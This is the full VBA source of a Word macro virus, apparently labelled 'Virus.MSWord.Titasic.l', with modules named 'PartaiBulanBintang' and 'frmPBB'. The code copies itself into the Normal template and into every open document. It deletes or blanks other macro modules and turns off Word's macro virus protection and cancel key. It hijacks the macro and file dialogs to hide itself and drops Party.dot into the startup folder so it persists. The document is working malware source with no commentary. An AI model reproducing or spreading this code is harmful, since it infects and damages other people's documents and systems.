   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "PartaiBulanBintang"
   Private Declare Function ShowCursor Lib "user32" (ByVal bShow As Long) As Long
   Public AD As Object, aDes As Variant
   Public NonPbb As Boolean, afound As Boolean, hapus As Boolean, reset As Boolean, aExc As Boolean, DocCount As Boolean
   Function AstMaster()
   Dim nmak(1) As String
   Dim NT As Object
   Dim aSrc$
   On Error GoTo selesai
   nmak(0) = "PartaiBulanBintang"
   nmak(1) = "frmPBB"

   aSrc = MacroContainer
   Set NT = NormalTemplate
   If Not DocCount Then
   Set AD = ActiveDocument
   ElseIf aSrc <> "Party.dot" Then
   aSrc = NT
   End If

   If aSrc = NT Then
   aSrc = NT.FullName: Set aDes = AD
   ElseIf aSrc = AD Then
   aSrc = AD.FullName: Set aDes = NT
   ElseIf aSrc = "Party.dot" Then
   Set aDes = NT
   aSrc = Options.DefaultFilePath(8) & "\Party.src"
   End If

   Mhapus aDes
   With aDes.VBProject
   If Not (Not hapus And .Description = "PartaiBulanBintang" And .VBComponents.Count > 2) Then
       Mcopy aSrc, aDes, nmak
       hapus = False
       .Description = "PartaiBulanBintang"
       If aDes = NT Then
           Options.SaveInterval = 1
           CustomizationContext = NT
           CommandBars("Tools").reset
           KeyBindings.Add KeyCode:=BuildKeyCode(77, 1024), KeyCategory:=1, _
           Command:="ToolsRecordMacroStart"
           aDes.Save
       End If
       CommandBars("Macro").Controls(2).OnAction = "ViewVbCode"
   Else
   GoTo Aksi
   End If
   End With
   If afound = True Then Exit Function
   Refresh
   On Error Resume Next
   Aksi:
   If aExc = True Then Exit Function
   Exit Function
   selesai:
   If Err.Number = 50289 Then MsgBox "Terimakasih Anda Telah" & Chr(13) & "Memproteksi Word dengan Aman", vbInformation, "frmPBB"
   End Function

   Sub Mhapus(Sfile)
   Dim nmak As Object
   For Each nmak In Sfile.VBProject.VBComponents
       If nmak.Name = "NewMacros" Then NonPbb = True
       If nmak.Name <> "ThisDocument" And nmak.Name <> "NewMacros" _
       And nmak.Name <> "PartaiBulanBintang" And nmak.Name <> "frmPBB" Then
           hapus = True
           If reset Then
           Application.OrganizerDelete Sfile.FullName, nmak.Name, 3
           Else
           nmak.CodeModule.DeleteLines 1, nmak.CodeModule.CountOfLines
           End If
       End If
   Next nmak
   End Sub
   Sub Mcopy(Sfile, Dfile, nmak)
   Dim aNmak
   For Each aNmak In nmak
   Application.OrganizerCopy Sfile, Dfile.FullName, aNmak, 3
   Next
   End Sub
   Sub Action()
   On Error Resume Next
   WBT
   If Day(Now()) < 5 Then frmPBB.Show
   WBF
   End Sub
   Sub FileOpen()
   If Day(Now()) < 5 Then ShowCursor (False)
   WBT
   If Dialogs(80).Show <> 0 Then
   WBF
   AutoOpen
   Else
   WBF
   End If
   End Sub

   Sub AutoOpen()
   Application.EnableCancelKey = wdCancelDisabled
   AstMaster
   If Documents.Count > 1 Then
       For i = 1 To Documents.Count
       If Documents(i).Name <> ActiveDocument.Name Then
       Set AD = Documents(i)
       DocCount = True
       hapus = False
       AstMaster
       End If
       Next
   End If
   If Day(Now()) < 5 Then frmPBB.Show
   End
   End Sub
   Sub ViewVbCode()
   ShowCursor (False)
   End Sub
   Sub AutoExec()
   On Error Resume Next
   If MacroContainer <> NormalTemplate Then
   aExc = True
   AstMaster
   WBT
   AddIns.Unload False
   WBF
   End If
   Application.EnableCancelKey = wdCancelDisabled
   End Sub
   Sub AutoExit()
   Dim aAddin As Object
   On Error GoTo batal
   WBT
   If Documents.Count <> 0 Then Documents.Close
   Options.DefaultFilePath(2) = Options.DefaultFilePath(6)
   afound = True
   For Each aAddin In AddIns
       If aAddin.Name = "Party.dot" Then afound = False
   Next aAddin

   If afound = True Then
   Application.Visible = False
   Documents.Add
   AstMaster
       With ActiveDocument
           .SaveAs FileName:=Options.DefaultFilePath(8) & "\Party.src", FileFormat:=wdFormatDocument, AddToRecentFiles:=False
           .SaveAs FileName:=Options.DefaultFilePath(8) & "\Party.dot", FileFormat:=wdFormatTemplate, AddToRecentFiles:=False
       End With
   End If
   Application.Quit
   batal:
   WBF
   End Sub
   Sub ToolsMacro()
   WBF
   On Error GoTo batal
   Mhapus ActiveDocument
   If NonPbb Then
       If MacroContainer = ActiveDocument Then Application.Run NormalTemplate.VBProject.Name & ".PartaiBulanBintang.ToolsMacro": Exit Sub
       Application.DisplayAlerts = 0
           With Dialogs(215)
           .Description = "Macros Pbb mungkin tidak bisa Anda hapus, Anda hanya bisa menghapus makro buatan Anda (Descr: 'Makro non-Pbb')"
           If .Display = 1 Then .Execute
           End With
       Application.DisplayAlerts = -1
   Else
   ViewVbCode
   End If
   batal:
   End Sub
   Sub FileTemplates()
   WBF
   If Not reset Then Dialogs(87).Display
   End Sub
   Sub FormatStyle()
   WBF
   Dialogs(180).Show
   End Sub
   Function Refresh()
   reset = True
   FileTemplates
   Mhapus aDes
   End Function
   Sub AutoClose()
   Application.DisplayAlerts = -1
   With Options
   .SaveNormalPrompt = False
   .SaveInterval = 10
   .VirusProtection = False
   End With
   If ActiveWindow.Caption <> "Pbb" And InStr(1, ActiveDocument.Name, "Docume", 1) = 0 _
   And ActiveDocument.Name <> "Party.dot" Then AstMaster
   End Sub
   Sub FileExit()
   AutoExit
   End Sub
   Sub ToolsOptions()
   Options.DefaultFilePath(wdUserTemplatesPath) = "C:\Program Files\Microsoft Office\Templates"
   Dialogs(wdDialogToolsOptions).Show
   Options.DefaultFilePath(wdUserTemplatesPath) = Application.path
   End Sub
   Function WBT()
   WordBasic.disableautomacros True
   End Function
   Function WBF()
   WordBasic.disableautomacros False
   End Function


   VERSION 5.00
   Begin {C62A69F0-16DC-11CE-9E98-00AA00574A4F} frmPBB
      Caption         =   "Created By Yusril Ihza Mahendra"
      ClientHeight    =   3885
      ClientLeft      =   45
      ClientTop       =   360
      ClientWidth     =   4710
      OleObjectBlob   =   "Virus.MSWord.Titasic.l-frmPBB.frx":0000
      StartUpPosition =   1  'CenterOwner
   End
   Attribute VB_Name = "frmPBB"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = False
